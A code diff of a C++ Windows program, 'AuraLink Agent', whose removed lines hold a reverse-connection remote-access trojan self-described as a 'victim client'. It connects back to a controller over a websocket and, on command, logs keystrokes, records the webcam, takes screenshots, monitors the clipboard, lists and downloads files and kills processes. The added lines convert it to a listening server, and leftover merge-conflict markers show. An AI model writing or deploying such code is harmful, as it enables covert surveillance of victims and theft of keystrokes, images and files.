@@ -1,9 +1,4 @@
-﻿// =============================================================
-// AURALINK AGENT (VICTIM CLIENT)
-// Tinh nang: Auto Detect Server & Execute Commands
-// =============================================================
-
-// --- CAU HINH WINDOWS ---
+﻿// --- CAU HINH WINDOWS ---
 #ifndef _WIN32_WINNT
 #define _WIN32_WINNT 0x0A00 
 #endif
@@ -11,7 +6,7 @@
 #include <boost/beast/core.hpp>
 #include <boost/beast/websocket.hpp>
 #include <boost/asio/ip/tcp.hpp>
-#include <boost/asio/connect.hpp>
+#include <boost/asio/strand.hpp>
 #include <cstdlib>      
 #include <iostream>
 #include <string>
@@ -20,7 +15,7 @@
 #include <vector>
 #include <fstream>
 #include <windows.h>   
-#include <iphlpapi.h> // Thu vien lay IP
+#include <iphlpapi.h>
 #include <atomic> 
 #include <iomanip>
 
@@ -33,7 +28,6 @@
 #include "TextToSpeech.h"
 #include "Clipboard.h"
 #include "FileTransfer.h"
-
 // Link thu vien Windows
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -50,51 +44,7 @@ namespace net = boost::asio;
 using tcp = boost::asio::ip::tcp;
 
 // =============================================================
-// CẤU HÌNH KẾT NỐI
-// =============================================================
-const std::string MIDDLE_SERVER_PORT = "8080";
-
-// --- HAM LOGIC DONG BO IP (QUAN TRONG) ---
-// Server tu set IP minh thanh .100, nen Client cung se tim den .100
-std::string GetSmartServerIP() {
-    ULONG outBufLen = 15000;
-
-    // [FIX LỖI E0144] Sua lai cach cast pointer cho dung chuan C++
-    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
-
-    // Phong truong hop bo nho khong du
-    if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
-        free(pAdapterInfo);
-        pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
-    }
-
-    std::string targetIP = "127.0.0.1"; // Default neu khong tim thay mang
-
-    if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &outBufLen) == NO_ERROR) {
-        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
-        while (pAdapter) {
-            std::string ip = pAdapter->IpAddressList.IpAddress.String;
-            std::string gateway = pAdapter->GatewayList.IpAddress.String;
-
-            // Chi lay mang co Internet (Gateway khac 0)
-            if (ip != "0.0.0.0" && gateway != "0.0.0.0") {
-                size_t lastDot = ip.find_last_of('.');
-                if (lastDot != std::string::npos) {
-                    std::string prefix = ip.substr(0, lastDot);
-
-                    targetIP = prefix + ".100";
-                    break; // Tim thay mang active la chot luon
-                }
-            }
-            pAdapter = pAdapter->Next;
-        }
-    }
-    if (pAdapterInfo) free(pAdapterInfo);
-    return targetIP;
-}
-
-// =============================================================
-// PHAN 1: CAC HAM HO TRO SYSTEM INFO 
+// PHAN 1: CAC HAM HO TRO (LIVE STATUS & RESOURCES)
 // =============================================================
 
 static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -143,6 +93,24 @@ std::string GetOSVersionStr() {
         DWORD dataSize = sizeof(productName);
         if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)productName, &dataSize) == ERROR_SUCCESS) {
             osName = std::string(productName);
+        }
+
+        char currentBuild[32] = { 0 };
+        dataSize = sizeof(currentBuild);
+        if (RegQueryValueExA(hKey, "CurrentBuild", nullptr, nullptr, (LPBYTE)currentBuild, &dataSize) == ERROR_SUCCESS) {
+            int buildNumber = std::atoi(currentBuild);
+            // Windows 11 bat dau tu build 22000
+            if (buildNumber >= 22000) {
+                // Thay the chu "Windows 10" thanh "Windows 11" neu co
+                size_t pos = osName.find("Windows 10");
+                if (pos != std::string::npos) {
+                    osName.replace(pos, 10, "Windows 11");
+                }
+                else if (osName.find("Windows 11") == std::string::npos) {
+                    // Neu khong tim thay chu Windows 10, them Windows 11 vao
+                    osName = "Windows 11 " + osName;
+                }
+            }
         }
         RegCloseKey(hKey);
     }
@@ -208,13 +176,18 @@ std::string GetCpuUsage() {
     unsigned long long diffTotal = total - prevTotal;
     unsigned long long diffIdle = idle - prevIdle;
 
+    // Cap nhat lai trang thai cu
     prevTotal = total;
     prevIdle = idle;
 
     if (diffTotal == 0) return "0";
+
     double usage = (100.0 * (diffTotal - diffIdle)) / diffTotal;
+
+    // Gioi han 0-100
     if (usage < 0) usage = 0;
     if (usage > 100) usage = 100;
+
     return std::to_string((int)usage);
 }
 
@@ -227,227 +200,30 @@ std::string GetBatteryStatus() {
     return "Unknown";
 }
 
-// Ham thuc hien lenh Shutdown/Restart
-void DoShutdown(); 
-void DoRestart(); 
-
-std::thread g_webcamThread;
-
-// =============================================================
-// PHAN 2: XU LY KET NOI CLIENT (REVERSE CONNECTION)
-// =============================================================
-
-void RunAgent() {
-    // Khoi tao cac module tinh (static)
-    static Keylogger myKeylogger;
-    static Process myProcessModule;
-    static Application myAppModule;
-    static Clipboard myClipboard;
-
-    while (true) {
-        try {
-            // [SYNC] Tự động tính toán IP Server (.100)
-            std::string currentServerIP = GetSmartServerIP();
-            std::cout << "[INFO] Auto-detected Server IP: " << currentServerIP << "\n";
-
-            net::io_context ioc;
-            tcp::resolver resolver(ioc);
-
-            // 1. Resolve dia chi Server
-            auto const results = resolver.resolve(currentServerIP, MIDDLE_SERVER_PORT);
-
-            // 2. Tao websocket
-            websocket::stream<tcp::socket> ws(ioc);
-
-            // 3. Ket noi TCP
-            net::connect(ws.next_layer(), results.begin(), results.end());
-
-            // 4. Handshake Websocket
-            ws.handshake(currentServerIP, "/");
-
-            std::cout << "[CONNECTED] Connected to MiddleServer at " << currentServerIP << "!\n";
-
-            // 5. GUI DINH DANH
-            std::string identity = "TYPE:VICTIM|" + GetComputerNameStr() + "|" + GetOSVersionStr();
-            ws.write(net::buffer(identity));
-
-            // 6. VONG LAP LANG NGHE LENH TU ADMIN
-            beast::flat_buffer buffer;
-            while (true) {
-                // Doc lenh
-                ws.read(buffer);
-                std::string command = beast::buffers_to_string(buffer.data());
-                buffer.consume(buffer.size());
-
-                // --- XU LY LENH (GIU NGUYEN) ---
-                if (command == "get-sys-info") {
-                    std::string hostname = GetComputerNameStr();
-                    std::string os = GetOSVersionStr();
-                    std::string ramFree = GetRamFree();
-                    std::string battery = GetBatteryStatus();
-                    std::string diskFree = GetDiskFree();
-                    std::string procCount = GetProcessCount();
-                    std::string cpuUsage = GetCpuUsage();
-                    std::string ramUsage = GetRamUsagePercent();
-
-                    std::string response = "sys-info " + hostname + "|" + os + "|" + ramFree + "|" + battery + "|" + diskFree + "|" + procCount + "|" + cpuUsage + "|" + ramUsage;
-                    ws.text(true); ws.write(net::buffer(response));
-                }
-                else if (command == "ping") {
-                    ws.text(true); ws.write(net::buffer("pong"));
-                }
-                else if (command == "shutdown") {
-                    ws.text(true); ws.write(net::buffer("Server: OK, shutting down in 15s..."));
-                    std::this_thread::sleep_for(std::chrono::seconds(2));
-                    DoShutdown();
-                }
-                else if (command == "restart") {
-                    ws.text(true); ws.write(net::buffer("Server: OK, restarting in 15s..."));
-                    std::this_thread::sleep_for(std::chrono::seconds(2));
-                    DoRestart();
-                }
-                // --- MEDIA ---
-                else if (command == "capture") {
-                    if (g_webcamThread.joinable()) {
-                        ws.text(true); ws.write(net::buffer("Server: Busy recording..."));
-                    }
-                    else {
-                        ws.text(true); ws.write(net::buffer("Server: Started recording..."));
-                        g_webcamThread = std::thread([&ws]() {
-                            std::vector<char> videoData = CaptureWebcam(10);
-                            if (!videoData.empty()) {
-                                std::string encoded = base64_encode(videoData);
-                                try {
-                                    ws.text(true); ws.write(net::buffer("file " + encoded));
-                                }
-                                catch (...) {}
-                            }
-                            });
-                        g_webcamThread.detach();
+void PrintLocalIPs() {
+    ULONG outBufLen = 15000;
+    PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
+    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen) == NO_ERROR) {
+        PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
+        while (pCurrAddresses) {
+            if (pCurrAddresses->OperStatus == IfOperStatusUp && pCurrAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK) {
+                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddresses->FirstUnicastAddress;
+                if (pUnicast) {
+                    char ip[INET_ADDRSTRLEN];
+                    sockaddr_in* sa_in = (sockaddr_in*)pUnicast->Address.lpSockaddr;
+                    inet_ntop(AF_INET, &(sa_in->sin_addr), ip, INET_ADDRSTRLEN);
+                    std::string ipStr(ip);
+                    if (ipStr.find("192.168.") == 0 || ipStr.find("10.") == 0 || ipStr.find("172.") == 0) {
+                        std::cout << ">>> YOUR SERVER IP: " << ipStr << " <<<\n";
                     }
                 }
-                else if (command == "screenshot") {
-                    ws.text(true); ws.write(net::buffer("Server: OK, capturing screenshot..."));
-                    int width = GetSystemMetrics(SM_CXSCREEN);
-                    int height = GetSystemMetrics(SM_CYSCREEN);
-                    std::vector<std::uint8_t> pixels = ScreenShot();
-                    if (pixels.empty()) {
-                        ws.text(true); ws.write(net::buffer("Server: Error capturing screenshot."));
-                    }
-                    else {
-                        std::vector<char> bytes(pixels.begin(), pixels.end());
-                        std::string encoded = base64_encode(bytes);
-                        std::string response = "screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded;
-                        ws.text(true); ws.write(net::buffer(response));
-                    }
-                }
-                // --- KEYLOGGER ---
-                else if (command == "start-keylog") {
-                    myKeylogger.StartKeyLogging();
-                    ws.text(true); ws.write(net::buffer("Server: Keylogger started (background)..."));
-                }
-                else if (command == "stop-keylog") {
-                    myKeylogger.StopKeyLogging();
-                    ws.text(true); ws.write(net::buffer("Server: Keylogger stopped."));
-                }
-                else if (command == "get-keylog") {
-                    std::string logs = myKeylogger.GetLoggedKeys();
-                    ws.text(true); ws.write(net::buffer(logs));
-                }
-                // --- PROCESS ---
-                else if (command == "ps") {
-                    std::string list = myProcessModule.ListProcesses();
-                    ws.text(true); ws.write(net::buffer(list));
-                }
-                else if (command.rfind("start ", 0) == 0) {
-                    std::string appName = command.substr(6);
-                    if (myProcessModule.StartProcess(appName)) ws.write(net::buffer("Server: Started successfully: " + appName));
-                    else ws.write(net::buffer("Server: Error! Could not start: " + appName));
-                }
-                else if (command.rfind("kill ", 0) == 0) {
-                    std::string target = command.substr(5);
-                    ws.write(net::buffer("Server: " + myProcessModule.StopProcess(target)));
-                }
-                // --- APPS ---
-                else if (command == "list-app") {
-                    myAppModule.LoadInstalledApps();
-                    auto apps = myAppModule.ListApplicationsWithStatus();
-                    if (apps.empty()) ws.write(net::buffer("Server: No apps found."));
-                    else {
-                        std::string msg = "DANH SACH UNG DUNG\n";
-                        for (size_t i = 0; i < apps.size(); ++i) {
-                            msg += "[" + std::to_string(i) + "] " + apps[i].first.name + (apps[i].second ? " (RUNNING)" : "") + "\n";
-                            msg += "Exe: " + apps[i].first.path + "\n";
-                        }
-                        ws.write(net::buffer(msg));
-                    }
-                }
-                else if (command.rfind("start-app ", 0) == 0) {
-                    std::string input = command.substr(10);
-                    bool ok = myAppModule.StartApplication(input);
-                    ws.write(net::buffer(ok ? "Server: Started " + input : "Server: Failed " + input));
-                }
-                else if (command.rfind("stop-app ", 0) == 0) {
-                    std::string input = command.substr(9);
-                    bool ok = myAppModule.StopApplication(input);
-                    ws.write(net::buffer(ok ? "Server: Stopped " + input : "Server: Failed stop " + input));
-                }
-                // --- TTS & CLIPBOARD ---
-                else if (command.rfind("tts ", 0) == 0) {
-                    std::string text = command.substr(4);
-                    static TextToSpeech myTTS;
-                    myTTS.Speak(text);
-                    ws.write(net::buffer("Server: OK, speaking"));
-                }
-                else if (command == "start-clip") {
-                    myClipboard.StartMonitoring();
-                    ws.write(net::buffer("Server: Clipboard Monitor STARTED"));
-                }
-                else if (command == "stop-clip") {
-                    myClipboard.StopMonitoring();
-                    ws.write(net::buffer("Server: Clipboard Monitor STOPPED"));
-                }
-                else if (command == "get-clip") {
-                    std::string logs = myClipboard.GetLogs();
-                    if (logs.empty()) logs = "[No clipboard data]";
-                    ws.write(net::buffer("CLIPBOARD_DATA:\n" + logs));
-                }
-                // --- FILE TRANSFER ---
-                else if (command.rfind("download-file ", 0) == 0) {
-                    std::string filepath = command.substr(14);
-                    // Trim space
-                    filepath.erase(0, filepath.find_first_not_of(" \n\r\t"));
-                    filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);
-                    std::string response = FileTransfer::HandleDownloadRequest(filepath);
-                    ws.write(net::buffer(response));
-                }
-                else if (command == "ls" || command.rfind("ls ", 0) == 0) {
-                    std::string targetPath;
-
-                    if (command == "ls") {
-                        targetPath = "MyComputer";
-                    }
-                    else {
-                        targetPath = command.substr(3);
-                    }
-
-                    std::string result = FileTransfer::ListDirectory(targetPath);
-
-                    ws.text(true);
-                    ws.write(net::buffer(result));
-                    }
             }
-        }
-        catch (std::exception const& e) {
-            std::cerr << "[ERROR] Connection lost: " << e.what() << "\n";
-            std::cerr << "[RETRY] Reconnecting in 5 seconds...\n";
-            std::this_thread::sleep_for(std::chrono::seconds(5));
+            pCurrAddresses = pCurrAddresses->Next;
         }
     }
+    free(pAddresses);
 }
 
-<<<<<<< HEAD
-=======
 void DoShutdown();
 void DoRestart();
 std::thread g_webcamThread;
@@ -712,17 +488,21 @@ private:
     }
 };
 
->>>>>>> 8b412ae054e6f54a216f30dc03a6528c766fc5ec
 int main() {
-    // Cai dat DPI Aware
     SetProcessDPIAware();
 
-    std::cout << "========================================\n";
-    std::cout << "   AURALINK AGENT (SMART CLIENT)\n";
-    std::cout << "========================================\n";
-    std::cout << "AUTO DETECTING SERVER IP...\n";
+    auto const address = net::ip::make_address("0.0.0.0");
+    auto const port = static_cast<unsigned short>(8080);
+    int const threads = 1;
 
-    RunAgent();
+    std::cout << "Starting AuraLink Server...\n";
+    PrintLocalIPs();
+    std::cout << "Listening on ws://" << address.to_string() << ":" << port << "\n";
+    std::cout << "----------------------------------\n";
+
+    net::io_context ioc{ threads };
+    std::make_shared<listener>(ioc, tcp::endpoint{ address, port })->run();
+    ioc.run();
 
     return EXIT_SUCCESS;
 }
